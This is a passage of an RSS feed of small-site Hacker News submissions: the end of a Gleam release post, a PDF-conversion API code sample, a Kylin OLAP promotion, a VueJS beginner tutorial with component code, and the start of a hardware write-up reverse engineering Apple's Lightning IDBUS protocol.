  <li><a href="https://github.com/mvellandi">Mario Vellandi</a></li>
  <li><a href="https://github.com/mario-mazo">mario</a></li>
  <li><a href="https://github.com/michaeljones">Michael Jones</a></li>
  <li><a href="https://github.com/mroach">Mike Roach</a></li>
  <li><a href="https://github.com/ontofractal">ontofractal</a></li>
  <li><a href="https://github.com/sorentwo">Parker Selbert</a></li>
  <li><a href="https://github.com/CrowdHailer">Peter Saxton</a></li>
  <li><a href="https://github.com/QuinnWilton">Quinn Wilton</a></li>
  <li><a href="https://github.com/romatthe">Robin Mattheussen</a></li>
  <li><a href="https://github.com/gootik">Sasan Hezarkhani</a></li>
  <li><a href="https://github.com/sascha-wolf">Sascha Wolf</a></li>
  <li><a href="https://github.com/scileo">Sasha</a></li>
  <li><a href="https://github.com/sasa1977">Saša Jurić</a></li>
  <li><a href="https://github.com/seanjensengrey">Sean Jensen-Grey</a></li>
  <li><a href="https://github.com/sporto">Sebastian Porto</a></li>
  <li><a href="https://github.com/MainShayne233">Shayne Tremblay</a></li>
  <li><a href="https://github.com/shritesh">Shritesh Bhattarai</a></li>
  <li><a href="https://github.com/simonewebdesign">Simone Vittori</a></li>
  <li><a href="https://github.com/tomwhatmore">Tom Whatmore</a></li>
  <li><a href="https://github.com/tsloughter">Tristan Sloughter</a></li>
  <li><a href="https://github.com/twilco">Tyler Wilcock</a></li>
  <li><a href="https://github.com/wojtekmach">Wojtek Mach</a></li>
</ul>

<p>Thanks for reading! Have fun! 💜</p>


    </section></div>]]>
            </description>
            <link>https://lpil.uk/blog/gleam-v0.10-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706211</guid>
            <pubDate>Wed, 01 Jul 2020 20:30:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The VC Tech Stack]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706088">thread link</a>) | @simonebrunozzi
<br/>
July 1, 2020 | https://www.notion.so/0ec6e7230a7346ca93e2aedadfa69f57?v=456671244d38416da377c858a6df6151 | <a href="https://web.archive.org/web/*/https://www.notion.so/0ec6e7230a7346ca93e2aedadfa69f57?v=456671244d38416da377c858a6df6151">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/0ec6e7230a7346ca93e2aedadfa69f57?v=456671244d38416da377c858a6df6151</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706088</guid>
            <pubDate>Wed, 01 Jul 2020 20:20:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Pdf.to – PDF Converter API]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706071">thread link</a>) | @nadermx
<br/>
July 1, 2020 | https://pdf.to/api | <a href="https://web.archive.org/web/*/https://pdf.to/api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        
                        <p>Choose the perfect plan for you. Cancel anytime.</p>
                        
                        <hr>
                        <ul>
                            <li>
                                <a href="https://pdf.to/api/documentation/"><u>Read the documentation</u></a>
                            </li>
                        </ul>
                    </div><div>
                        <div>
                            
                            <div>
                                <div>
                                    <div id="python">
                                        <pre><code><span>import</span> requests
<span>import</span> json

api_path = '<span>https://pdf.to</span>'
url = '%s<span>/v1/api</span>' % api_path
files = {<span>'file'</span>: <span>open('static/uploads/testing.pdf', 'rb')</span>}
params = {'<span>convert_to</span>': '<span>png</span>'}
data = {'<span>data</span>': <span>json.dumps(params)</span>}
headers = {'<span>Authorization</span>': '<span>&lt;YOUR_API_KEY&gt;</span>'}
r = requests.post(
    url,
    files=files,
    data=data,
    headers=headers
)
response = r.json()</code></pre>
                                    </div>
                                    <div id="javascript">
                                        <pre>var requestParams = {
    url: "https://pdf.to/app/",
    method: "post",
    contentType: false,
    dataType: false,
    cache: false,
    processData: false
};
var fd = new FormData();
fd.append("files[0]", "example1.doc");
fd.append("data", JSON.stringify({"tool": "to_pdf"}));
requestParams.data = formData;
var p = $.ajax(requestParams);
p.then(function(response) {
    console.log(response);
});
</pre>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div></div>]]>
            </description>
            <link>https://pdf.to/api</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706071</guid>
            <pubDate>Wed, 01 Jul 2020 20:19:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apache Kylin enables unmatched scalability for big data analytics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706011">thread link</a>) | @samanticora
<br/>
July 1, 2020 | https://kyligence.io/resources/extreme-olap-with-apache-kylin/ | <a href="https://web.archive.org/web/*/https://kyligence.io/resources/extreme-olap-with-apache-kylin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="constructor-page">

        
            
                <section>

    
    

    <div>

                    

        
        


                            
            

                            <h5>
                    Find out why Kylin's augmented take on traditional OLAP has revolutionized the way enterprises work with massive datasets.                </h5>
                    

        
    </div>
</section>

                    
            
                
<section>
    <div>

        <div>

            <div>

                <div>

                    

                    
                    <p><a id="play-btn" data-video-embed="<iframe width=&quot;640&quot; height=&quot;360&quot; src=&quot;https://www.youtube.com/embed/18CDJm9OVjQ?feature=oembed&amp;controls=1&amp;hd=1&amp;autohide=1&amp;autoplay=1&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen frameborder=&quot;0&quot;></iframe>">
                        <img src="https://kyligence.io/wp-content/themes/Kyligence_theme/images/icons/play-btn.svg" alt="Play">
                    </a></p>
                </div>



            </div>
            <div>
                <div>
                                            <h2>
                            See Extreme OLAP in Action                        </h2>
                    
                                            <h5>
                            <p>Learn how this new approach to OLAP enables unmatched scalability and query speeds for analytics on Big Data.</p>
                        </h5>
                    
                </div>
            </div>
        </div>

    </div>
</section>

                    
            
                

<section>
    <div>

        
        
        <div>


            <div>
                                    <div>
                        <h4><strong>OLAP technology that redefines what’s possible</strong></h4>
<p>Discover what it means to have truly fast business intelligence (BI) at your disposal. With Extreme <a href="https://kyligence.io/blog/olap-analytics-is-dead-really/" target="_blank" rel="noopener">OLAP</a>, slow queries on Big Data are a thing of the past. If you’re looking for a way to overcome the challenge of generating insights from massive datasets, extreme OLAP is your way forward.</p>
<p>Take the next step towards building an analytics environment that can <a href="https://kyligence.io/solution/accelerate-bi%e2%80%8b-on-big-data/" target="_blank" rel="noopener">deliver instant insights to your analysts</a>. This guide compares the two leading Extreme OLAP solutions, <a href="https://kyligence.io/apache-kylin-overview/" target="_blank" rel="noopener">Apache Kylin</a> and Kyligence, so you can make the best choice for your BI needs.</p>
                    </div>
                
                                    
                            </div>


            <div>
                <div>

                                            <p><img src="https://kyligence.io/wp-content/uploads/2019/02/apache-kylin896512.png" alt="Icon">
                        </p>
                    
                </div>
            </div>



        </div>

    </div>

</section>
                    
            
                <section>
    <div>
        <div>
            <div>
                                    <div>
                        <h4><strong>Make the right choice when it comes to OLAP on Big Data</strong></h4>
<p>For enterprises working with massive data volumes and who desire a higher level of service, security controls, and other sophisticated capabilities to support their analytics work <a href="https://kyligence.io/kyligence-enterprise/" target="_blank" rel="noopener">on-premises</a> and <a href="https://kyligence.io/kyligence-cloud/" target="_blank" rel="noopener">on the Cloud</a>, an open source OLAP solution like Apache Kylin may not be able to fully meet their needs.</p>
<p>If your BI requirements are more complex or ultra-high performance and concurrency for every tool and on any operating system is a priority, Kyligence <a href="https://kyligence.io/blog/kyligence-augmented-olap-for-the-big-data-era/" target="_blank" rel="noopener">Augmented OLAP</a> may be a better option. This comparison guide for Apache Kylin and Kyligence can help you decide between these two solutions. It includes:</p>

<ul>
<li><strong>A <a href="https://kyligence.io/comparing-kylin-vs-kyligence/" target="_blank" rel="noopener">side-by-side comparison</a> of Apache Kylin and Kyligence features.</strong></li>
<li><strong>A high-level explanation of both solutions and where they work best.</strong></li>
<li><strong>An overview of key capabilities for both Kylin and Kyligence.</strong></li>
</ul>

<p>Get your OLAP analytics comparison guide for Apache Kylin and Kyligence today. Download now!</p>
                    </div>
                            </div>

                        
                    </div>
    </div>
</section>
                    

        </div></div>]]>
            </description>
            <link>https://kyligence.io/resources/extreme-olap-with-apache-kylin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706011</guid>
            <pubDate>Wed, 01 Jul 2020 20:15:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understand VueJS in 5 Minutes]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23705917">thread link</a>) | @jesuisundev
<br/>
July 1, 2020 | https://www.jesuisundev.com/en/understand-vuejs-in-5-minutes/ | <a href="https://web.archive.org/web/*/https://www.jesuisundev.com/en/understand-vuejs-in-5-minutes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
<!-- Horizontal Top Article -->
<p>I’ve been playing with VueJS recently. I’m impressed. It’s simple, powerful, super fun and incredibly popular. Even a moron like me can do interesting things with it rapidly. It just goes to show that anybody can do great things with it. Do you have five minutes in front of you ?</p>



<h3>Once upon a time</h3>



<p>2012 in the New York area. <strong>At that time <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/youyuxi" target="_blank" rel="noreferrer noopener">Evan You</a> is living his best life learning Javascript.</strong> He’s doing side projects left and right for laughs. One of them explodes in <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://news.ycombinator.com/item?id=3618387" target="_blank" rel="noreferrer noopener">popularity on Hackernews</a> ! Evan didn’t know, but he just got Google’s attention.</p>



<figure><img src="https://i.imgur.com/8wEZsjZ.png" data-src="https://i.imgur.com/8wEZsjZ.png" alt="vuejs"></figure>



<p>Very quickly hired at Google, his role is to create “experimental projects” for innovative ideas. He uses a lot of vanilla Javascript. He tries AngularJS and other frameworks, but he rages instantly on it. He doesn’t find the freedom he needs. So he had an idea : <strong>extract the best part of these frameworks and make his own light and malleable framework for his own personal need</strong>.</p>



<p>In July 2013, the first commit of VueJS was made. For the record, VueJS was to be called Seed.JS. But it was taken on NPM! Since its framework is centered around the view part, Evan wanted something that looked like “View” in English. He went to google translate and translated “View” into several languages. <strong>He came across the French translation “Vue” and <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.youtube.com/watch?v=OrxmtDw4pVI&amp;feature=youtu.be&amp;t=374" target="_blank" rel="noreferrer noopener">found it cool</a>.</strong> A few minutes later, VueJS was published.</p>



<p>In 2014, the first version of VueJS arrived on the Internet. The project doesn’t explode right away. But like <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/taylorotwell/status/590585596780879872" target="_blank" rel="noreferrer noopener">the creator of Laravel</a>, more and more people are talking about it. Today, <a href="https://npm-stat.com/charts.html?package=react&amp;package=vue&amp;package=angular&amp;from=2014-05-20&amp;to=2020-05-20" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">VueJS is in the big league</a>.</p>



<h3>What is VueJS ?</h3>



<p><strong>VueJS is a Javascript frontend framework to create user interfaces.</strong> You’re going to say “one more?” and the answer is yes. Except it’s a little different.</p>



<p><strong>First, it’s interesting to understand that VueJS was designed to be incrementally integrated</strong>. That means if you have an existing frontend application, you don’t have to redo everything. You can make a new part in VueJS and quickly integrate it with the rest.</p>



<p>VueJS is also the most is easy to pick up of all the frontend framework. <strong>That’s what attracted me as a backend developer in the first place. </strong>Very quickly, I did some frontend stuff that worked ! I was shocked! Within a few hours of reading the doc and testing stuff, I had understood all the basics. I was already shipping frontend.</p>



<figure><img src="https://i.imgur.com/UTgj9wh.png" data-src="https://i.imgur.com/UTgj9wh.png" alt="ship"></figure>



<p>VueJS also takes good ideas from its competitors. It allows data binding.<strong> The data and the DOM are coupled and reactive to changes.</strong> We also find <a href="https://bitsofco.de/understanding-the-virtual-dom/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">the concept of virtual dom</a> with VueJS. The DOM is not directly changed, it goes through the virtual DOM.</p>



<p>We also find <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components.html" target="_blank" rel="noreferrer noopener">the organization by component</a>. <strong>This feature allows you to divide your application into several sub-components that each manage their own life and are reusable.</strong> Let’s imagine you want to make a list of images: you can make a component that manages an image and a component that manages a list of image components.</p>



<p>That’s all well and good, but how does it work?</p>



<h3>How does it work?</h3>



<p>For once I cheat a bit and show some code in advance to better understand what’s coming next. Hello World!</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;script src="https://cdn.jsdelivr.net/npm/vue"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;{{ message }}&lt;/div&gt;
    &lt;script&gt;
      const data = { message: "Hello World !" };
      new Vue({
        el: "#app",
        data: data
      });
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>



<p>VueJS focuses on the view part of your application.<strong> To do so, the framework is partly inspired by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel" target="_blank" rel="noreferrer noopener">the MVVM architecture pattern</a>.</strong> VueJS will link your DOM, the view part, with your view instance, the Model-View part. These two parts are linked by the data-binding system.</p>



<p>Finally, the data in your view instance is the Model part. <strong>It will provide your application with data.</strong> The Hello World code schematized looks like this.</p>



<div><figure><img src="https://i.imgur.com/p3IKY9G.jpg" data-src="https://i.imgur.com/p3IKY9G.jpg" alt="vuejs"></figure></div>



<p>A VueJS application is composed of one or more components. When the instance of the global application is launched, there is first a root instance. <strong>This is root instance is composed of a tree of components which have their own root instance.</strong></p>



<p>But what happens to the life cycle of your instance when you create the component with new Vue()? I wanted to make my usual silly schema but it turns out that t<strong>he official VueJS doc is just EXCELLENT</strong>. <a href="https://www.jesuisundev.com/en/please-write-your-technical-documentation/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">It’s rare to have a good documentation</a>. So I’m just going to pump their schema.</p>



<div><figure><img src="https://vuejs.org/images/lifecycle.png" data-src="https://vuejs.org/images/lifecycle.png" alt="vuejs"></figure></div>



<p>I’ll let you admire it and figure out what’s going on. The only thing that might be unclear is the difference between “created” and “mounted”.</p>



<ul><li><strong>Created </strong>means that the element is only available in the View-Model part.</li><li><strong>Mounted </strong>in VueJS means that the DOM element has been rendered in your page and you can manipulate it.<br></li></ul>



<p>OK great, now let’s get our hands dirty.</p>



<h3>Show me the code</h3>



<p>I’m gonna show you a piece of code I made for a personal need. <strong>A simple responsive gallery with only three components.</strong> We start with the root app.</p>



<p><strong>app.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div id="app"&gt;
    &lt;action v-bind:message="messageAction"&gt;&lt;/action&gt;
    &lt;grid v-bind:photos="photos"&gt;&lt;/grid&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  import action from './components/action.vue'
  import grid from './components/grid.vue'

  export default {
    name: 'App',
    components: { action, grid },
    data: function () {
      return {
        photos: [
          {
            id: 0,
            url: "https://i.imgur.com/p3IKY9G.jpg"
          }
        ],
        messageAction: "It's working !"
      }
    }
  }
&lt;/script&gt;

&lt;style&gt;
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: Arial;
  }
&lt;/style&gt;</pre>



<p>On the <strong>template side</strong> I start by declaring my root app in a div. Inside there are two other components (action and grid). <strong>Note how I pass the data that comes from the instance seen in the components with the v-bind directives.</strong></p>



<p>On the <strong>script side</strong>, I import the components to use them in the app we export. We declare the data, the pictures and a message, which is reactive to changes.</p>



<p>On the <strong>style side</strong> I integrate very simple CSS that is global to the whole project.</p>



<p>Next up, the action component.</p>



<p><strong>action.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="callToAction"&gt;
    &lt;h1&gt;{{ message }}&lt;/h1&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'callToAction',
    props: {
      message: String
    }
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .callToAction {
    position: absolute;
    height: 100%;
    width: 100%;
    padding: 0;
    margin: 0;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  h1 {
    color: red;
    background:black;
    padding: 10px;
  }
&lt;/style&gt;
</pre>



<p>The action component is simply a text that we put in the middle of the page and that will be a call to action for the user.<strong> I use the {{ message }} syntax to display the message that comes from the app.</strong></p>



<p>Note also that the style part is “scoped”. <strong>This means that the CSS in question has effect only in this component.</strong> This is very useful to separate the style scope of each component.</p>



<p><strong>grid.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="grid"&gt;
    &lt;div v-bind:key="grid.id" v-for="grid in grids" class="column"&gt;
      &lt;photo
        v-for="photo in grid" 
        v-bind:photo="photo" 
        v-bind:key="photo.id"
      &gt;&lt;/photo&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import photo from './photo.vue'

export default {
  name: 'grid',
  components: { photo },
  props: ['photos'],
  computed: {
    grids: function () {
      const grids = []
      const deepClonePhotos = JSON.parse(JSON.stringify(this.photos))
      const gridsToMake = Math.ceil(deepClonePhotos.length / 2) - 1
      
      for (let index = 0; index &lt;= gridsToMake; index++) {
        const currentGrid = []

        for(let i = 0; i &lt; 2; i++) {
          if(deepClonePhotos.length) {
            currentGrid.push(deepClonePhotos.shift())
          }
        }
        
        grids.push(currentGrid)
      }

      return grids
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
  .grid {
    display: -ms-flexbox; /* IE10 */
    display: flex;
    -ms-flex-wrap: wrap; /* IE10 */
    flex-wrap: wrap;
    padding: 0;
  }

  /* Create four equal columns that sits next to each other */
  .column {
    -ms-flex: 25%; /* IE10 */
    flex: 25%;
    max-width: 25%;
    padding: 0;
  }

  /* Responsive layout - makes a two column-layout instead of four columns */
  @media screen and (max-width: 800px) {
    .column {
      -ms-flex: 50%;
      flex: 50%;
      max-width: 50%;
    }
  }

  /* Responsive layout - makes the two columns stack on top of each other instead of next to each other */
  @media screen and (max-width: 600px) {
    .column {
      -ms-flex: 100%;
      flex: 100%;
      max-width: 100%;
    }
  }
&lt;/style&gt;
</pre>



<p>The grid component is the one that will make the logic to display image grids in relation to the data it receives from the app. In the template part I create a column every two images. In these columns I display my two images. I do this using another photo component. <strong>You will notice the use of the v-for directive to browse my lists.</strong></p>



<p>In the script part, <strong>I use <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components-props.html" target="_blank" rel="noreferrer noopener">props</a> to get the data passed by the v-bind in the app</strong>. Then I use the computed function to create a new grids variable with the data of the pictures.</p>



<p><strong>photo.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;img :src="photo.url" alt ="" /&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'photo',
    props: ['photo']
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .column img {
    vertical-align: middle;
    width: 100%;
  }
&lt;/style&gt;
</pre>



<p>The photo component just allows me to isolate the display of the photo in a corner. It’s quite simple, but it allows me to change a lot of things on this side in the future without having to touch the logic above! <strong>As usual, I put a little <a href="https://codesandbox.io/s/vuejs-en-5-minutes-fz4h4" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">codesandbox</a>, you can play with it and see it all in action.</strong></p>







<h3>Epilogue</h3>



<p>We’ve been talking VueJS for more than five minutes now. You have to understand that after reading …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jesuisundev.com/en/understand-vuejs-in-5-minutes/">https://www.jesuisundev.com/en/understand-vuejs-in-5-minutes/</a></em></p>]]>
            </description>
            <link>https://www.jesuisundev.com/en/understand-vuejs-in-5-minutes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705917</guid>
            <pubDate>Wed, 01 Jul 2020 20:07:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Lightning]]>
            </title>
            <description>
<![CDATA[
Score 499 | Comments 199 (<a href="https://news.ycombinator.com/item?id=23705546">thread link</a>) | @captn3m0
<br/>
July 1, 2020 | https://nyansatan.github.io/lightning/ | <a href="https://web.archive.org/web/*/https://nyansatan.github.io/lightning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>
                            <th></th>
                            <th colspan="3">Meaningful</th>
                            <th colspan="2">Recovery</th>
                        </tr>
                        <tr>
                            <th>Word</th>
                            <th>Min</th>
                            <th>Typ</th>
                            <th>Max</th>
                            <th>Min</th>
                            <th>Typ</th>
                        </tr>
                        <tr>
                            <td><b>BREAK</b></td>
                            <td>12</td>
                            <td>14</td>
                            <td>16</td>
                            <td>2.5</td>
                            <td>4.5</td>
                        </tr>
                        <tr>
                            <td><b>WAKE</b></td>
                            <td>22</td>
                            <td>24</td>
                            <td>27</td>
                            <td></td>
                            <td>1100?</td>
                        </tr>
                        <tr>
                            <td><b>ZERO</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>3</td>
                        </tr>
                        <tr>
                            <td><b>ONE</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>8.5</td>
                        </tr>
                        <tr>
                            <td><b>ZERO with STOP*</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>16</td>
                        </tr>
                        <tr>
                            <td><b>ONE with STOP*</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

